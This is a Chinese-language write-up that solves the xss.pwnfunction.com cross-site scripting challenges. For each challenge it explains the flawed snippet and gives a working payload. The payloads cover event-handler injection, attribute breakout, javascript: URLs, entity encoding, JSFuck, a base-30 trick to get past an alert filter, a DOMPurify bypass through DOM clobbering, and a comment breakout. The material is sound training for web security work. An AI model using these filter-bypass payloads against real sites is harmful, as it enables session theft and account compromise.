# XSS

## 链接

* [XSS Cheat Sheet](https://www.mdeditor.tw/pl/ppwu/zh-tw)
* [OWASP Web Security Testing Guide](https://github.com/OWASP/wstg/tree/master/document)
* [PortSwigger Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## xss.pwnfunction.com 题目解析

### 1. ma-spaghet!

题目链接：https://xss.pwnfunction.com/warmups/ma-spaghet/

```html
<!-- Challenge -->
<h2 id="spaghet"></h2>
<script>
    spaghet.innerHTML = (new URL(location).searchParams.get('somebody') || "Somebody") + " Toucha Ma Spaghet!"
</script>
```

**问题分析**

Client side script 将URL中的somebody参数作为**spaghet**的innerHTML。因此，只要构造一个合法的HTML标签来触发Javascript代码即可。
由于浏览器解析顺序是自上而下，先执行javascript，然后再渲染HTML。如果向spaghet.innerHTML中插入\<script\>标签，则不能自动执行，这里
可以考虑使用\<svg\>或者\<img\>标签。

**答案**

```html
* <img src="x" onerror="alert(1337)">
* <svg onload="alert(1337)"/>
```

### 2. Jefff

题目链接：https://xss.pwnfunction.com/warmups/jefff/

```html
<!-- Challenge -->
<h2 id="maname"></h2>
<script>
    let jeff = (new URL(location).searchParams.get('jeff') || "JEFFF")
    let ma = ""
    eval(`ma = "Ma name ${jeff}"`)
    setTimeout(_ => {
        maname.innerText = ma
    }, 1000)
</script>
```

**问题分析**

Client side script 将URL中的jeff参数注入到一段代码中，然后执行这段代码。这里使用了模版字面量
（[Template literals](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals)）。
jeff参数被编码成一段字符串与"Ma name "连接。因此，如果想要注入代码并获得执行，需要break这段字符串。

**答案**

```html
* \"-alert(1237)-\"
```

这里使用转义字符来插入引号，插入减号（也可以插入加号，但是要做URL编码）来构造一段合法的js代码（ma = "Ma name " - alert(1337) - ""）。

### 3. Ugandan Knuckles

题目链接：https://xss.pwnfunction.com/warmups/da-wey/

```html
<!-- Challenge -->
<div id="uganda"></div>
<script>
    let wey = (new URL(location).searchParams.get('wey') || "do you know da wey?");
    wey = wey.replace(/[<>]/g, '')
    uganda.innerHTML = `<input type="text" placeholder="${wey}" class="form-control">`
</script>
```

**问题分析**

Client side script将参数 wey 插入到\<input\>中国作为属性placeholder的值。因此，需要break引号，并插入一个新的属性，使其触发alert函数。

**答案**

```html
* " onfocus=alert(1337) autofocus="
* " onclick="alert(1337)
```

### 4. Ricardo Milos

题目链接：https://xss.pwnfunction.com/warmups/ricardo/

```html
<!-- Challenge -->
<form id="ricardo" method="GET">
    <input name="milos" type="text" class="form-control" placeholder="True" value="True">
</form>
<script>
    ricardo.action = (new URL(location).searchParams.get('ricardo') || '#')
    setTimeout(_ => {
        ricardo.submit()
    }, 2000)
</script>
```

**问题分析**

script标签中的代码将 ricardo 参数赋值给 ricardo form 的 action。[HTML Form](https://www.w3schools.com/tags/att_form_action.asp)
的 action 属性是一个URL。如果它包含了javascript协议号，则其后的代码会被浏览器执行，可参考
[RULE#7 - Avoid Javascript URLs](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

**答案**

```html
* javascript:alert(1337)
```

### 5. Ah That's Hawt

题目链接：https://xss.pwnfunction.com/warmups/thats-hawt/

```html
<!-- Challenge -->
<h2 id="will"></h2>
<script>
    smith = (new URL(location).searchParams.get('markassbrownlee') || "Ah That's Hawt")
    smith = smith.replace(/[\(\`\)\\]/g, '')
    will.innerHTML = smith
</script>
```

**问题分析**

Javascript代码将 markassbrownlee 参数中的 [, (, `, ), \ 过滤后（替换成空字符），嵌入 will，作为它的 innerHTML。
innerHTML首先考虑\<svg\>和\<img\>标签，比如：```<svg onload="alert(1337)"``，但 () 会被过滤掉。因此可以考虑通过编码来绕过。

**[HTML实体编码](https://code.google.com/archive/p/browsersec/wikis/Part1.wiki#HTML_entity_encoding)**

HTML Entities 是一种特殊的HTML编码方式。它的主要目的是用来安全的渲染某些特殊的保留字符，比如 > 和 < 等。
它主要有3种编码方式：
* 预定义的有名实体，格式是：&\<name\>; 比如：\&lt; \&gt; \&rarr;
* 10进制实体，格式是：&#\<nn\>; 其中 nn 是要被编码字符的10进制 Unicode 值，比如：\&#60;
* 16进制实体，格式是：&#x\<nn\>; 其中 nn 是要被编码字符的16进制 Unicode 值，比如：\&#x3c;

**答案**

```html
<!-- HTML entities encoding -->
<svg onload="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x33;&#x33;&#x37;&#x29;">
<!-- URL encoding -->
%3csvg%20onload%3d%22%26%23x61%3b%26%23x6c%3b%26%23x65%3b%26%23x72%3b%26%23x74%3b%26%23x28%3b%26%23x31%3b%26%23x33%3b%26%23x33%3b%26%23x37%3b%26%23x29%3b%22%3e

<!-- HTML entities encoding -->
<svg onload="alert&#x28;&#x31;&#x33;&#x33;&#x37;&#x29;">
<!-- URL encoding -->
%3csvg%20onload%3d%22alert%26%23x28%3b%26%23x31%3b%26%23x33%3b%26%23x33%3b%26%23x37%3b%26%23x29%3b%22%3e

<!-- HTML entities encoding -->
<svg onload="alert&#x28;1337&#x29;">
<!-- URL encoding -->
%3csvg%20onload%3d%22alert%26%23x28%3b1337%26%23x29%3b%22%3e
```

* 首先将括号进行 HTML Entities 编码，其结果是 \&#28; \&#29;
* 然后将 HTML Entities 编码结果进行 URL encoding，来处理特殊字符，比如 &

### 6. Ligma

题目链接：https://xss.pwnfunction.com/warmups/ligma/

```html
<!-- Challenge -->
balls = (new URL(location).searchParams.get('balls') || "Ninja has Ligma")
balls = balls.replace(/[A-Za-z0-9]/g, '')
eval(balls)
```

**问题分析**

balls.replace() 将 A-Z, a-z, 0-9 全部替换成了空字符，因此要找到一种不使用这些字符的编码方式。
[JSFuck](http://www.jsfuck.com/)正好是这样的一款工具。它可以将 alert(1337) 编码成如下内容：

```text
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])
```

对以上内容做 URL 编码，结果如下：

```text
%5b%5d%5b(!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%5d%5b(%5b%5d%5b(!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d%5b(!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%5d)%5b%2b!%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b(%5b%5d%5b%5b%5d%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(%5b%5d%5b%5b%5d%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(%5b%5d%5b(!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d%5b(!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%5d)%5b%2b!%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%5d((!!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(%5b%5d%5b%5b%5d%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(%5b%5d%5b%5b%5d%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(%2b%5b!%5b%5d%5d%2b%5b%5d%5b(!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%5d)%5b%2b!%2b%5b%5d%2b%5b%2b!%2b%5b%5d%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(%2b(!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%2b%5b%2b!%2b%5b%5d%5d))%5b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d%5b(!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%5d)%5b%2b!%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b(%5b%5d%2b%5b%5d)%5b(%5b%5d%5b(!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d%5b(!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%5d)%5b%2b!%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b(%5b%5d%5b%5b%5d%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(%5b%5d%5b%5b%5d%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(%5b%5d%5b(!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d%5b(!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%5d)%5b%2b!%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%5d%5b(%5b%5d%5b%5b%5d%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b((%2b%5b%5d)%5b(%5b%5d%5b(!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d%5b(!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%5d)%5b%2b!%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b(%5b%5d%5b%5b%5d%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(%5b%5d%5b%5b%5d%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(%5b%5d%5b(!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d%5b(!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%5d)%5b%2b!%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%2b%5b%2b!%2b%5b%5d%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%5d%5d%5d(!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%2b%5b!%2b%5b%5d%2b!%2b%5b%5d%5d)%2b(!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%5d)()((!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(%5b%5d%5b(!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%2b%5b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%5d%5d%2b%5b%2b!%2b%5b%5d%5d%2b%5b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b%5b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b%5b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(%5b%2b%5b%5d%5d%2b!%5b%5d%2b%5b%5d%5b(!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%5d%2b(!%5b%5d%2b%5b%5d)%5b%2b!%2b%5b%5d%5d%2b(!!%5b%5d%2b%5b%5d)%5b%2b%5b%5d%5d%5d)%5b!%2b%5b%5d%2b!%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d)
```

**答案**

如上文中的 URL 编码结果。

### 7. Mafia

题目链接：https://xss.pwnfunction.com/warmups/mafia/

```html
<!-- Challenge -->
mafia = (new URL(location).searchParams.get('mafia') || '1+1')
mafia = mafia.slice(0, 50)
mafia = mafia.replace(/[\`\'\"\+\-\!\\\[\]]/gi, '_')
mafia = mafia.replace(/alert/g, '_')
eval(mafia)
```

**问题分析**

代码对用户输入做了3次处理：
* 限制长度不超过50个字符。因此，JSFuck不再适用。
* 替换了一些在 Javascript 中常用的字符。未替换数字和括号，因此可以继续使用数字和括号。
* 替换了 alert。不能直接使用 alert 函数，需要找到绕过方法。

Javascript 的 toString 和 parseInt 函数可以在数字和字符串之间进行
[转换](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/toString) 。
以30为基数对 alert 字符串进行转换 parseInt('alert', 30)，其结果为 8680439。
再以30为基数进行还原，可以重新得到 alert 字符串：8680439..toString(30)。

**答案**

```html
eval(8680439..toString(30))(1337)
```

以上结果相当于：alert(1337)

### 8. Ok, Boomer

题目链接：https://xss.pwnfunction.com/warmups/ok-boomer/

```html
<!-- Challenge -->
<h2 id="boomer">Ok, Boomer.</h2>
<script>
    boomer.innerHTML = DOMPurify.sanitize(new URL(location).searchParams.get('boomer') || "Ok, Boomer")
    setTimeout(ok, 2000)
</script>
```

**问题分析**

代码对用户输入用 DOMPurity.sanitize 做了消杀，因此 boomer.innerHTML 中无法携带有害代码。
可以考虑利用后面的 setTimeout 调用。该代码在2秒后执行了 ok。可以利用 boomer 参数创建一个 id 为 ok 的 tag。

```html
<a id=ok href=tel:alert(1337)>
```

这里要利用的是 \<a\> 和 href 属性。href 可以使用 tel 协议，而 tel 协议被 DOMPurify 认为是安全的，因此可以绕过 DOMPurify。

https://github.com/cure53/DOMPurify/blob/main/README.md


**答案**

如上文代码。


### 9. Area 51

题目链接：https://xss.pwnfunction.com/challenges/area-51/

```html
<!-- Challenge -->
<div id="pwnme"></div>

<script>
    var input = (new URL(location).searchParams.get('debug') || '').replace(/[\!\-\/\#\&\;\%]/g, '_');
    var template = document.createElement('template');
    template.innerHTML = input;
    pwnme.innerHTML = "<!-- <p> DEBUG: " + template.outerHTML + " </p> -->";
</script>
```

**问题分析**

代码对用户输入做了过滤，！、-、#、&、；、% 都被过滤掉了，因此既不能做 HTML Entities 编码，也不能做 URL Encoding。
难点在于如何 break 掉之前的注释，否则用户的输入会注入到注释中，不会被浏览器执行。

[HTML标准中的tag-open-state](https://www.w3.org/TR/html52/syntax.html#tag-open-state)
篇提到，如果遇到 Question Mark (?) 则视为解析错误，浏览器应该创建一个内容为空的 comment token。

测试一下，输入如下代码作为参数：
```html
<?>test
```
查看返回页面的源代码，可以看到 \<?\> 已经变成了 \<!--?--\>，在 test 之前成功注入了一个 comment 的终止标记。
```html
<div id="pwnme"><!-- <p> DEBUG: <template><!--?-->test <p></p> --&gt;</div>
```

**答案**


```html
<?><svg onload="alert(1337)"></svg>
```